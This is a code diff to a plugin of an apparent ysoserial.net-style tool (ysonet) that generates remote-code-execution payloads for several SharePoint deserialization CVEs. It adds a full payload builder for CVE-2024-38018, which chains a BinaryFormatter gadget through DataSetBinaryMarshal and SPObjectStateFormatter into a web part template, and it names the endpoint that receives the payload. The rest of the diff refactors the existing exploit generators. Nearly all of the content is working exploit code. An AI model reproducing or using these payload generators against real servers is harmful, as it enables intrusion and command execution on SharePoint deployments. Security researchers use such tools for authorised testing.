@@ -1,12 +1,11 @@
 ﻿using NDesk.Options;
 using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
-using System.Linq;
-using System.Security.Cryptography.X509Certificates;
+using System.Reflection;
 using System.Text;
-using System.Text.RegularExpressions;
 using ysonet.Generators;
 using ysonet.Helpers;
 
@@ -21,6 +20,7 @@ using ysonet.Helpers;
  *      CVE-2019-0604: https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
  *      CVE-2018-8421: https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/
  *      CVE-2025-49704: https://blog.viettelcybersecurity.com/sharepoint-toolshell/
+ *      CVE-2024-38018: https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ (https://x.com/chudyPB/status/1945420677109936582) 
  **/
 
 namespace ysonet.Plugins
@@ -35,9 +35,9 @@ namespace ysonet.Plugins
 
         static OptionSet options = new OptionSet()
             {
-                {"cve=", "the CVE reference: CVE-2025-49704 (url-encoded), CVE-2020-1147 (url-encoded), CVE-2019-0604, CVE-2018-8421", v => cve = v },
+                {"cve=", "the CVE reference: CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421", v => cve = v },
                 {"useurl", "to use the XAML url rather than using the direct command in CVE-2019-0604 and CVE-2018-8421", v => useurl = v != null },
-                {"g|gadget=", "a gadget chain that supports LosFormatter for CVE-2020-1147. Default: TypeConfuseDelegate ", v => gadget = v },
+                {"g|gadget=", "a gadget chain for CVE-2020-1147 (LosFormatter) or CVE-2024-38018 (BinaryFormatter). Default: TypeConfuseDelegate ", v => gadget = v },
                 {"c|command=", "the command to be executed e.g. \"cmd /c calc\" or the XAML url e.g. \"http://b8.ee/x\" to make the payload shorter with the `--useurl` argument", v => command = v },
                 {"var|variant=", "Variant number for CVE-2025-49704 only. Choices: 1 (default, uses DataSetOldBehaviourGenerator variant 2), 2 (uses DataSetOldBehaviourFromFileGenerator variant 2)", v => int.TryParse(v, out variant) },
             };
@@ -49,12 +49,12 @@ namespace ysonet.Plugins
 
         public string Description()
         {
-            return "Generates payloads for the following SharePoint CVEs: CVE-2025-49704, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421";
+            return "Generates payloads for the following SharePoint CVEs: CVE-2024-38018, CVE-2025-49704, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421";
         }
 
         public string Credit()
         {
-            return "CVE-2025-49704: Khoa Dinh - implemented by Soroush Dalili, CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili";
+            return "CVE-2024-38018: Piotr Bazydło - explained by Khoa Dinh & implemented by Soroush Dalili, CVE-2025-49704: Khoa Dinh - implemented by Soroush Dalili, CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili";
         }
 
         public OptionSet Options()
@@ -116,6 +116,11 @@ namespace ysonet.Plugins
                                 "\r\n The payload needs to be sent in the MSOTlPn_DWP parameter to /_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx" +
                                 "\r\n-->";
                     break;
+                case "cve-2024-38018":
+                    payload = CVE_2024_38018();
+                    payload += "\r\n\r\n<!--\r\n The payload can be sent to any page supporting webparts such as /_vti_bin/webpartpages.asmx" +
+                                "\r\n-->";
+                    break;
             }
 
             if (String.IsNullOrEmpty(payload))
@@ -127,6 +132,121 @@ namespace ysonet.Plugins
             }
 
             return payload;
+        }
+
+        public string CVE_2024_38018()
+        {
+            InputArgs inputArgs = new InputArgs();
+            inputArgs.Cmd = command;
+            inputArgs.IsRawCmd = true;
+            inputArgs.Minify = false;
+            inputArgs.UseSimpleType = false;
+
+            string formatter = "binaryformatter";
+            byte[] binaryformatterPayload = new byte[] { };
+
+            // Use GadgetHelper to validate gadget exists
+            if (!GadgetHelper.GadgetExists(gadget))
+            {
+                Console.WriteLine("Gadget not supported.");
+                System.Environment.Exit(-1);
+            }
+
+            // Use GadgetHelper to create gadget instance
+            IGenerator generator = GadgetHelper.CreateGadgetInstance(gadget);
+            if (generator == null)
+            {
+                Console.WriteLine("Gadget not supported!");
+                System.Environment.Exit(-1);
+            }
+
+            if (generator.IsSupported(formatter))
+            {
+                binaryformatterPayload = (byte[])generator.GenerateWithNoTest(formatter, inputArgs);
+            }
+            else
+            {
+                Console.WriteLine("BinaryFormatter not supported by the selected gadget.");
+                System.Environment.Exit(-1);
+            }
+
+            // Base paths
+            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
+            string dllsFolder = Path.Combine(baseDir, "dlls/sharepoint/19/");
+
+
+            // register a quick assembly‐resolver so LoadFrom() will pick up any *other* DLL
+            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
+            {
+                // look for the requested DLL by name in our dllsFolder
+                string simpleName = new AssemblyName(args.Name).Name + ".dll";
+                string candidate = Path.Combine(dllsFolder, simpleName);
+                return File.Exists(candidate)
+                    ? Assembly.LoadFrom(candidate)
+                    : null;
+            };
+
+
+            // --- Load Microsoft.SharePoint.dll ---
+            string spPath = Path.Combine(dllsFolder, "Microsoft.SharePoint.dll");
+            if (!File.Exists(spPath))
+                throw new FileNotFoundException("Microsoft.SharePoint.dll not found", spPath);
+            Assembly spAsm = Assembly.LoadFrom(spPath);
+
+            // --- Load Microsoft.SharePoint.ApplicationPages.dll ---
+            string appPagesPath = Path.Combine(dllsFolder, "Microsoft.SharePoint.ApplicationPages.dll");
+            if (!File.Exists(appPagesPath))
+                throw new FileNotFoundException("Microsoft.SharePoint.ApplicationPages.dll not found", appPagesPath);
+            Assembly appPagesAsm = Assembly.LoadFrom(appPagesPath);
+
+            // --- Get the formatter type from Microsoft.SharePoint.dll ---
+            Type fmtType = spAsm.GetType(
+                "Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter",
+                throwOnError: true,
+                ignoreCase: false);
+
+
+            // --- Create SPObjectStateFormatter instance ---
+            // This is for SharePoint 2019
+            // SharePoint 2013 just uses LosFormatter which can be replaced manually in the final payload!
+            object spformatter = Activator.CreateInstance(fmtType);
+
+            // --- Find its public Serialize(ArrayList) method ---
+            MethodInfo miSerialize = fmtType.GetMethod(
+                "Serialize",
+                BindingFlags.Instance | BindingFlags.Public,
+                binder: null,
+                types: new[] { typeof(Object) },
+                modifiers: null);
+            if (miSerialize == null)
+                throw new MissingMethodException(fmtType.FullName, "Serialize");
+
+            //*
+            // --- Get the SPThemes type from Microsoft.SharePoint.ApplicationPages.dll ---
+            Type spThemesType = appPagesAsm.GetType(
+                "Microsoft.SharePoint.ApplicationPages.SPThemes",
+                throwOnError: true,
+                ignoreCase: false);
+
+
+            // --- Build your payload: DataSetBinaryMarshal wrapping your binaryformatter data and SPThemes type ---
+            var payloadDataSetMarshal = new DataSetBinaryMarshal(binaryformatterPayload);
+            payloadDataSetMarshal.SetDerivedType(spThemesType);
+
+            var list = new ArrayList { payloadDataSetMarshal };
+
+            string serializedPayload = (string)miSerialize.Invoke(spformatter, new object[] { payloadDataSetMarshal });
+
+            string final_payload_template = @"<%@ Register Tagprefix=""WebPartPages"" Namespace="" Microsoft.SharePoint.WebPartPages"" Assembly=""Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"" %>
+
+<WebPartPages:XmlWebPart ID=""SPWebPartManager"" runat=""Server"">
+    <WebPart
+        xmlns=""http://schemas.microsoft.com/WebPart/v2"">
+        <AttachedPropertiesShared>{serializedPayload}</AttachedPropertiesShared>
+    </WebPart>
+</WebPartPages:XmlWebPart>";
+
+            return final_payload_template.Replace("{serializedPayload}", serializedPayload);
         }
 
         public string CVE_2025_49704()
@@ -152,27 +272,35 @@ runat=""server"">
 
             if (variant == 2)
             {
-                // Variant 2: Use DataSetOldBehaviourFromFileGenerator variant 2
-                DataSetOldBehaviourFromFileGenerator dsFromFileGenerator = new DataSetOldBehaviourFromFileGenerator();
-                
-                inputArgs.ExtraInternalArguments = new List<string> { 
-                    "--spoofedAssembly", "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                // Variant 2: Use GadgetHelper to create DataSetOldBehaviourFromFileGenerator variant 2
+                IGenerator dsFromFileGenerator = GadgetHelper.CreateGadgetInstance("DataSetOldBehaviourFromFile");
+                if (dsFromFileGenerator == null)
+                {
+                    Console.WriteLine("DataSetOldBehaviourFromFileGenerator not supported!");
+                    System.Environment.Exit(-1);
+                }
+
+                inputArgs.ExtraInternalArguments = new List<string> {
                     "-var", "2"
                 };
 
-                payload_bytes = (byte[]) dsFromFileGenerator.GenerateWithNoTest("binaryformatter", inputArgs);
+                payload_bytes = (byte[])dsFromFileGenerator.GenerateWithNoTest("binaryformatter", inputArgs);
             }
             else
             {
-                // Variant 1 (default): Use DataSetOldBehaviourGenerator variant 2
-                DataSetOldBehaviourGenerator dsGenerator = new DataSetOldBehaviourGenerator();
+                // Variant 1 (default): Use GadgetHelper to create DataSetOldBehaviourGenerator variant 2
+                IGenerator dsGenerator = GadgetHelper.CreateGadgetInstance("DataSetOldBehaviour");
+                if (dsGenerator == null)
+                {
+                    Console.WriteLine("DataSetOldBehaviourGenerator not supported!");
+                    System.Environment.Exit(-1);
+                }
 
-                inputArgs.ExtraInternalArguments = new List<string> { 
-                    "--spoofedAssembly", "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                inputArgs.ExtraInternalArguments = new List<string> {
                     "-var", "2"
                 };
 
-                payload_bytes = (byte[]) dsGenerator.GenerateWithNoTest("binaryformatter", inputArgs);
+                payload_bytes = (byte[])dsGenerator.GenerateWithNoTest("binaryformatter", inputArgs);
             }
 
             byte[] compressedBytes;
@@ -192,7 +320,8 @@ runat=""server"">
 
             // minimisation of payload is not important here but we can do it if needed!
 
-            return final_payload_template.Replace("{GzipPayload}", base64Result).Replace("+", "%2B").Replace("&", "%26"); // POST body safe (minimal url-encoding)
+            //return final_payload_template.Replace("{GzipPayload}", base64Result).Replace("+", "%2B").Replace("&", "%26"); // POST body safe (minimal url-encoding)
+            return final_payload_template.Replace("{GzipPayload}", base64Result);
         }
 
 
@@ -206,26 +335,17 @@ runat=""server"">
 
             string formatter = "losformatter";
             string losFormatterPayload = "";
-            
-            var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());
-            // Populate list of available gadgets
-            var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface);
-            var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList();
 
-            if (!generators.Contains(gadget))
+            // Use GadgetHelper to validate gadget exists
+            if (!GadgetHelper.GadgetExists(gadget))
             {
                 Console.WriteLine("Gadget not supported.");
                 System.Environment.Exit(-1);
             }
 
-            // Instantiate Payload Generator
-            IGenerator generator = null;
-            try
-            {
-                var container = Activator.CreateInstance(null, "ysonet.Generators." + gadget + "Generator");
-                generator = (IGenerator)container.Unwrap();
-            }
-            catch
+            // Use GadgetHelper to create gadget instance
+            IGenerator generator = GadgetHelper.CreateGadgetInstance(gadget);
+            if (generator == null)
             {
                 Console.WriteLine("Gadget not supported!");
                 System.Environment.Exit(-1);
@@ -266,7 +386,7 @@ runat=""server"">
         <ProjectedProperty0>
             <MethodName>Deserialize</MethodName>
             <MethodParameters>
-                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">"+ losFormatterPayload + @"</anyType>
+                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">" + losFormatterPayload + @"</anyType>
             </MethodParameters>
             <ObjectInstance xsi:type=""LosFormatter""></ObjectInstance>
         </ProjectedProperty0>
@@ -278,7 +398,9 @@ runat=""server"">
 
             // minimisation of payload is not important here but we can do it if needed!
 
-            return payload.Replace("+","%2B").Replace("&","%26"); // POST body safe (minimal url-encoding)
+            //return payload.Replace("+","%2B").Replace("&","%26"); // POST body safe (minimal url-encoding)
+
+            return payload;
         }
 
         public string CVE_2018_8421()
@@ -293,7 +415,7 @@ runat=""server"">
 <SequentialWorkflowActivity x:Class=""."" x:Name=""Workflow2"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
 xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/workflow"">
 <Rd:ResourceDictionary xmlns:Rd=""clr-namespace:System.Windows;Assembly=PresentationFramework,
-Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" Source="""+command+@"""/>
+Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" Source=""" + command + @"""/>
 </SequentialWorkflowActivity>
 ]]></workflowMarkupText>
 <rulesText></rulesText><configBlob></configBlob><flag>2</flag></ValidateWorkflowMarkupAndCreateSupportObjects></soap:Body></soap:Envelope>";
@@ -344,10 +466,6 @@ PublicKeyToken=31bf3856ad364e35"">
 
         public string CVE_2019_0604()
         {
-
-
-
-
             /*
             string payloadPart2 = @"<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
         <ExpandedElement/>
@@ -371,14 +489,21 @@ PublicKeyToken=31bf3856ad364e35"">
                 InputArgs inputArgs = new InputArgs();
                 inputArgs.Cmd = "foobar";
                 inputArgs.IsRawCmd = true;
-                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", command};
+                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", command };
                 inputArgs.Minify = true;
                 inputArgs.UseSimpleType = true;
 
                 payloadPart1 = typeof(Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties).AssemblyQualifiedName + ":";
                 payloadPart1 = payloadPart1.Replace(" ", "");
-                TextFormattingRunPropertiesGenerator myTFRPG = new TextFormattingRunPropertiesGenerator();
-                payloadPart2 = (string) myTFRPG.GenerateWithNoTest("DataContractSerializer", inputArgs);
+
+                // Use GadgetHelper to create TextFormattingRunPropertiesGenerator
+                IGenerator myTFRPG = GadgetHelper.CreateGadgetInstance("TextFormattingRunProperties");
+                if (myTFRPG == null)
+                {
+                    Console.WriteLine("TextFormattingRunPropertiesGenerator not supported!");
+                    System.Environment.Exit(-1);
+                }
+                payloadPart2 = (string)myTFRPG.GenerateWithNoTest("DataContractSerializer", inputArgs);
 
             }
             else
